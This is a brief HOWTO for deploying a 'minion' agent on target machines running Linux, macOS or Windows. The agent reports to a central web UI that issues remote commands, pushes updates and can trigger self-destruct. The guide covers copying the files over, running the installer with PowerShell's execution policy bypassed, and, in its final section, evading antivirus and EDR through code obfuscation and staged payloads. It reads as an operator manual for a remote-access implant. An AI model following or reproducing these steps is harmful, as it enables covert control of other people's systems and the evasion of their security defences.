# Agent Zero Minion Agent HOWTO

## 1. Preparation
- Edit `config.sample.json` with your server URL and token, save as `~/minion_config.json` on the target.
- Ensure Python 3 and `websocket-client` are installed (Linux/macOS).
- For Windows, compile `minion.py` to `minion.exe` using PyInstaller.

## 2. Linux/macOS Deployment
1. Copy files to target:
   ```bash
   scp minion.py installers/install_linux.sh user@target:~/
   scp minion_config.json user@target:~/
   ```
2. Run installer:
   ```bash
   bash installers/install_linux.sh
   ```
3. Check logs: `~/.minion.log`

## 3. Windows Deployment
1. Compile agent:
   ```powershell
   pyinstaller --onefile minion.py
   ```
2. Copy `minion.exe` and `installers/install_windows.ps1` to target.
3. Run installer:
   ```powershell
   powershell -ExecutionPolicy Bypass -File installers/install_windows.ps1
   ```
4. Check logs: `%APPDATA%\minion.log`

## 4. Web GUI & Remote Control
- Log in to Agent Zero Web UI.
- Minion should appear online.
- Send commands, view logs, and manage minions.

## 5. Updating & Self-Destruct
- Push update/self-destruct commands from Web UI or API.

## 6. Troubleshooting
- Check config path and permissions.
- Review log files for errors.
- Ensure outbound TLS/WS connection to server is allowed.

## 7. AV/EDR Evasion
- Obfuscate code (PyArmor, Nuitka, PowerShell obfuscators).
- Use staged payloads for initial access.
- Test against AV/EDR in a sandbox.
